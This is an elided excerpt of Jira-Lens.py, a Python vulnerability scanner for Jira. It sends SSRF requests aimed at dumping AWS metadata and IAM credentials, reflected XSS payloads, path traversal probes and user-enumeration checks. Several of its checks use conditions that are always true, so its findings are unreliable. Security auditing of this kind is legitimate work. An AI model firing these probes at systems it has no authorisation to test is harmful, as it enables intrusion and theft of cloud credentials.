# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-Jira-Lens\Jira-Lens\Jira-Lens.py
import argparse
import json
import os
import socket
...
def detect_version(base_url):
    r = requests.get(
        f"{base_url}/rest/api/latest/serverInfo",
    ...
    try:
        ...
        try:
            print(
                " [*] Host Address -->",
                socket.gethostbyaddr(urlparse(base_url).netloc)[0],
            )
        except:
        ...
        try:
            print(
                " [*] IP Address -->",
                socket.gethostbyaddr(urlparse(base_url).netloc)[2][0],
            )
            print("\n")
        except:
...
def CVE_2017_9506(base_url):  # (SSRF):
    ...
    r = requests.get(
        f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}",
        allow_redirects=False,
        headers=headers,
        verify=verify_ssl,
    )
    if r.status_code == 200 and "googlelogo" in str(r.content):
        print(
            f"{RED}[+] {GREEN} [CRITICAL] {RESET} Vulnerable To CVE-2017-9506 (SSRF) : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}\n"
        )
        response.append(
            f"[+] [CRITICAL] Vulnerable To CVE-2017-9506 (SSRF) : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}\n"
        )
        ...
        if is_aws:
            ...
            r = requests.get(
                f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_INSTANCE}",
                allow_redirects=False,
                headers=headers,
                verify=verify_ssl,
            )
            ...
            if r.status_code == 200:
                print(
                    f"\tAWS INSTANCE Recovered : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_INSTANCE}"
                )

            print("\n\tDUMPING AWS METADATA ")
            r = requests.get(
                f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_METADATA}",
                allow_redirects=False,
                headers=headers,
                verify=verify_ssl,
            )
            ...
            if r.status_code == 200:
                print(
                    f"\tAWS Metadata Recovered : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_METADATA}"
                )

            print("\n\tDUMPING AWS IAM DATA ")
            r = requests.get(
                f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_IAM_DATA}",
                allow_redirects=False,
                headers=headers,
                verify=verify_ssl,
            )
            ...
            if r.status_code == 200:
                print(
                    f"\tAWS IAM DATA Recovered : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_IAM_DATA}\n"
                )
        ...
        if r.status_code == 200:
            print(
                f"\t----> Alibaba Metadata Recovered : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}"
            )
        ...
        if r.status_code == 200:
            print(
                f"\t-----> Kubernetes ETCD API keys Found : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}"
            )
...
def CVE_2019_8449(base_url):  # User Info Disclosure:
    r = requests.get(
        f"{base_url}/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true",
        allow_redirects=False,
        headers=headers,
        verify=verify_ssl,
    )
    ...
    if r.status_code == 200:
        if "You are not authenticated. Authentication required to perform this operation." in str(r.content):
            ...
            print(
                f"{RED}[+] {GREEN} [LOW]{RESET} Vulnerable To CVE-2019-8449 : {base_url}/rest/pi/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true\n"
            )
            response.append(
                f"[+] [LOW] Vulnerable To CVE-2019-8449 : {base_url}/rest/pi/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true\n"
            )
    else:
        print(f"{GRAY}[-] Not Vulnerable To CVE-2019-8449\n")
...
def CVE_2019_8442(base_url):  # (Sensitive info disclosure):
    r = requests.get(
        f"{base_url}/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml",
        allow_redirects=False,
        headers=headers,
        verify=verify_ssl,
    )
    if r.status_code != 200:
        ...
        print(
            f"{RED}[+] {GREEN} [LOW]{RESET} Vulnerable To CVE-2019-8442 : {base_url}/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml\n"
        )
        response.append(
            f"[+] [LOW] Vulnerable To CVE-2019-8442 : {base_url}/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml\n"
        )


def CVE_2019_8443(base_url):  # (Sensitive info disclosure):
    r = requests.get(
        f"{base_url}/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml",
        allow_redirects=False,
        headers=headers,
        verify=verify_ssl,
    )
    if r.status_code == 200 or "<project" in str(r.content):
        print(
            f"{RED}[+] {GREEN} [LOW]{RESET} Vulnerable To CVE-2019-8443 : {base_url}/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml\n"
        )
        response.append(
            f"[+] [LOW] Vulnerable To CVE-2019-8443 : {base_url}/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml\n"
        )
    else:
...
def CVE_2019_8451(base_url):  # (SSRF):
    to_load = "https://google.com"
    r = requests.get(
        f"{base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}",
        allow_redirects=False,
        headers=headers,
        verify=verify_ssl,
    )
    if r.status_code == 200 and "googlelogo" in str(r.content):
        print(
            f"{RED}[+] {GREEN} [CRITICAL]{RESET} Vulnerable To CVE-2019-8451 (SSRF) : {base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}\n"
        )
        response.append(
            f"[+] [CRITICAL] Vulnerable To CVE-2019-8451 (SSRF) : {base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}\n"
        )
        print("\tChecking For AWS Metadata Extraction\n")
        if is_aws:
            print("\tAWS Instance Found")
...
def CVE_2019_3403(base_url):  # (User enum):
    r = requests.get(
        f"{base_url}/rest/api/2/user/picker?query=admin",
        allow_redirects=False,
        headers=headers,
        verify=verify_ssl,
    )
    ...
    if "The user named '{0}' does not exist" or "errorMessages" in str(r.content):
        ...
        print(
            f"{RED}[+] {GREEN} [LOW]{RESET} Vulnerable To CVE-2019-3403 : {base_url}/rest/api/2/user/picker?query=admin\n"
        )
...
def CVE_2019_3402(base_url):  # XSS in the labels gadget:
    r = requests.get(
        f'{base_url}/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert("XSS")%3C%2fscript%3Et1nmk&Search=Search',
        allow_redirects=False,
        headers=headers,
        verify=verify_ssl,
    )
    if "XSS" in str(r.content):
        print(
            f'{RED}[+] {GREEN} [HIGH]{RESET} Vulnerable To CVE-2019-3402 [Maybe] : {base_url}/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert("XSS")%3C%2fscript%3Et1nmk&Search=Search\n'
        )
        response.append(
            f'[+] [HIGH]  Vulnerable To CVE-2019-3402 [Maybe] {base_url}/secure/ConfigurePortal: {base_url}/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert("XSS")%3C%2fscript%3Et1nmk&Search=Search\n'
        )
    else:
...
def CVE_2019_11581(base_url):  # (SSTI):
    r = requests.get(
        f"{base_url}/secure/ContactAdministrators!default.jspa",
        allow_redirects=False,
        verify=verify_ssl,
    )
    if r.status_code == 200:
        if "Your Jira administrator" or "Contact Site Administrators" in str(r.content):
            ...
            print(
                f"{RED}[+] {GREEN} [CRITICAL]{RESET} Vulnerable To CVE-2019-11581 [Confirm Manually] : {base_url}/secure/ContactAdministrators!default.jspa\n"
            )
            response.append(
                f"[+] [CRITICAL] Vulnerable To CVE-2019-11581 [Confirm Manually] : {base_url}/secure/ContactAdministrators!default.jspa\n"
            )
    else:
        print(f"{GRAY}[-] Not Vulnerable To CVE-2019-11581\n")
...
def CVE_2020_14179(base_url):  # (Info disclosure):
    r = requests.get(
        f"{base_url}/secure/QueryComponent!Default.jspa",
        allow_redirects=False,
        headers=headers,
        verify=verify_ssl,
    )
    if r.status_code != 200:
        ...
        print(
            f"{RED}[+] {GREEN} [LOW]{RESET} Vulnerable To CVE-2020-14179 : {base_url}/secure/QueryComponent!Default.jspa\n"
        )
...
def CVE_2020_14181(base_url):  # (User enum):
    r = requests.get(
        f"{base_url}/secure/ViewUserHover.jspa?username=Admin",
        allow_redirects=False,
        headers=headers,
        verify=verify_ssl,
    )
    if r.status_code != 200 or "Your session has timed out" in str(r.content):
        ...
        print(
            f"{RED}[+] {GREEN} [LOW]{RESET} Vulnerable To CVE-2020-14181 : {base_url}/secure/ViewUserHover.jspa?username=Admin\n"
        )
        response.append(
            f"[+] [LOW] Vulnerable To CVE-2020-14181 : {base_url}/secure/ViewUserHover.jspa?username=Admin\n"
        )
...
def CVE_2018_20824(base_url):  # (XSS):
    print("\n")
    r = requests.get(
        f'{base_url}/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert("XSS_POPUP")',
        allow_redirects=False,
        headers=headers,
        verify=verify_ssl,
    )
    if "XSS_POPUP" in str(r.content):
        print(
            f"{RED}[+] {GREEN} [HIGH]{RESET} Vulnerable To CVE-2018-20824 : {base_url}/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)\n"
        )
        response.append(
            f"[+] [HIGH] Vulnerable To CVE-2018-20824 : {base_url}/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)\n"
        )
    else:
...
def CVE_2019_3396(base_url):  # (Path Traversal & RCE):
    ...
    r = requests.get(
        f"{base_url}/rest/tinymce/1/macro/preview",
        allow_redirects=False,
        headers=headers,
        verify=verify_ssl,
    )
    if r.status_code != 200:
        ...
        if "root" in str(r.content):
            print(
                f"{RED}[+] {GREEN} [CRITICAL]{RESET} Vulnerable To CVE-2019-3396 : {base_url}/rest/tinymce/1/macro/preview\n"
            )
            response.append(
                f"{RED}[+] [CRITICAL] Vulnerable To CVE-2019-3396 : {base_url}/rest/tinymce/1/macro/preview\n"
            )
...
def CVE_2020_36287_helper_2():
    if len(response_CVE_2020_36287) != 0:
        ...
        response.append(
            f"[+] [LOW] Vulnerable To CVE-2020-36287 : File Written at [CVE-2020-36287_{urlparse(url).netloc}.txt]\n"
        )
...
def CVE_2020_36289(base_url):
    r = requests.get(
        f"{base_url}/jira/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin",
        verify=verify_ssl,
    )
    # print("\n")
    if r.status_code == 200:
        if "Assignee" in str(r.content):
            print(
                f"{RED}[+] {GREEN} [MEDIUM] {RESET}Vulnerable To CVE-2020-36289 : {base_url}/jira/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin\n"
            )
            response.append(
                f"[+] [MEDIUM] Vulnerable To CVE-2020-36289 : {base_url}/jira/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin\n"
            )
        else:
...
def user_reg(base_url):
    try:
        r = requests.get(
            f"{base_url}/secure/Signup!default.jspa",
            allow_redirects=False,
            verify=verify_ssl,
        )
        if r.status_code == 200:
            if "private" in str(r.content):
                ...
                print(
                    f"{RED}[+] {GREEN}[Medium]{RESET} User regestration is Enabled : {base_url}/secure/Signup!default.jspa\n"
                )
...
def Unauth_User_picker(base_url):
    r = requests.get(
        f"{base_url}/secure/popups/UserPickerBrowser.jspa",
        allow_redirects=False,
        headers=headers,
    )
    if r.status_code != 200:
        ...
        if "user-picker" in str(r.content):
            print(
                f"{RED}[+] {CYAN}[INFO]{RESET} User Picker Enabled : {base_url}/secure/popups/UserPickerBrowser.jspa?max=1000\n"
            )
            response.append(
                f"[+] [INFO] User Picker Enabled : {base_url}/secure/popups/UserPickerBrowser.jspa?max=1000\n"
            )
...
def Unauth_Group_Picker(base_url):
    ...
    if r.status_code == 200:
        if "You are not authenticated. Authentication required to perform this operation." in str(r.content):
            ...
            print(
                f"{RED}[+] {CYAN}[INFO]{RESET} REST GroupUserPicker is available : {base_url}/rest/api/2/groupuserpicker\n"
            )
...
def Unauth_Projects(base_url):
    r = requests.get(
        f"{base_url}/rest/api/2/project?maxResults=100",
        allow_redirects=False,
        headers=headers,
    )
    if r.status_code == 200:
...
def Unauth_Project_categories(base_url):
    r = requests.get(
        f"{base_url}/rest/api/2/projectCategory?maxResults=1000",
        allow_redirects=False,
        headers=headers,
    )
    if r.status_code == 200:
        if "self" or "description" or "name" in str(r.content):
            print(
                f"{RED}[+] {GREEN}[LOW]{RESET} Project Groups Found : {base_url}/rest/api/2/projectCategory?maxResults=1000\n"
            )
...
def Unauth_Dashboard(base_url):
    r = requests.get(
        f"{base_url}/rest/api/2/dashboard?maxResults=100",
        allow_redirects=False,
        headers=headers,
    )
    if r.status_code == 200:
        if "dashboards" and "startAt" and "maxResults" in str(r.content):
            print(
                f"{RED}[+] {CYAN}[INFO]{RESET} Found Unauthenticated DashBoard Access{RESET} : {base_url}/rest/api/2/dashboard?maxResults=100\n"
            )
            response.append(
                f"[+] [INFO] Found Unauthenticated DashBoard Access : {base_url}/rest/api/2/dashboard?maxResults=100\n"
            )
        else:
...
def Unauth_Dashboard_Popular(base_url):
    r = requests.get(
        f"{base_url}/secure/ManageFilters.jspa?filter=popular&filterView=popular",
        allow_redirects=False,
        headers=headers,
    )
    if r.status_code == 200:
        if "Popular Filters" in str(r.content):
            print(
                f"{RED}[+] {CYAN}[INFO]{RESET} Filters Accessible : {base_url}/secure/ManageFilters.jspa?filter=popular&filterView=popular\n"
            )
            response.append(
                f"[+] [INFO] Filters Accessible : {base_url}/secure/ManageFilters.jspa?filter=popular&filterView=popular\n"
            )
        else:
...
def Unauth_Dashboard_admin(base_url):
    ...
    if r.status_code == 200:
        if "key" and "link" and "label" and "self" in str(r.content):
            print(
                f"{RED}[+] {CYAN}[INFO] {RESET} Admin Project Dashboard Accessible : {base_url}/rest/menu/latest/admin\n"
            )
...
def Service_desk_signup(base_url):
    ...
    r = requests.get(
        f"{base_url}/servicedesk/customer/user/signup",
        allow_redirects=False,
        headers=headers,
    )
    if r.status_code == 200:
        if "Service Management" in str(r.content):
            print(
                f"{RED}[+] {GREEN}[MEDIUM]{RESET} Service Desk Signup Enabled : {base_url}/servicedesk/customer/user/signup{RESET}\n"
            )
...
def Unauth_Install_Gadgets(base_url):
    ...
    if r.status_code == 200:
        if "jaxbDirectoryContents" in str(r.content):
            print(
                f"{RED}[+] {GREEN}[LOW]{RESET} REST Gadegts Accessible : {base_url}/rest/config/1.0/directory{RESET}\n"
            )
...
def FieldNames_QueryComponentJql(base_url):
    r = requests.get(
        f"{base_url}/secure/QueryComponent!Jql.jspa?jql=",
        allow_redirects=False,
        headers=headers,
    )
    if r.status_code == 200:
        if "searchers" in str(r.content):
            print(
                f"{RED}[+] {GREEN}[LOW] {RESET}Found Query Component Fields : {base_url}/secure/QueryComponent!Jql.jspa?jql=\n"
            )
            response.append(
                f"[+] [LOW] Found Query Component Fields : {base_url}/secure/QueryComponent!Jql.jspa?jql=\n"
            )
        else:
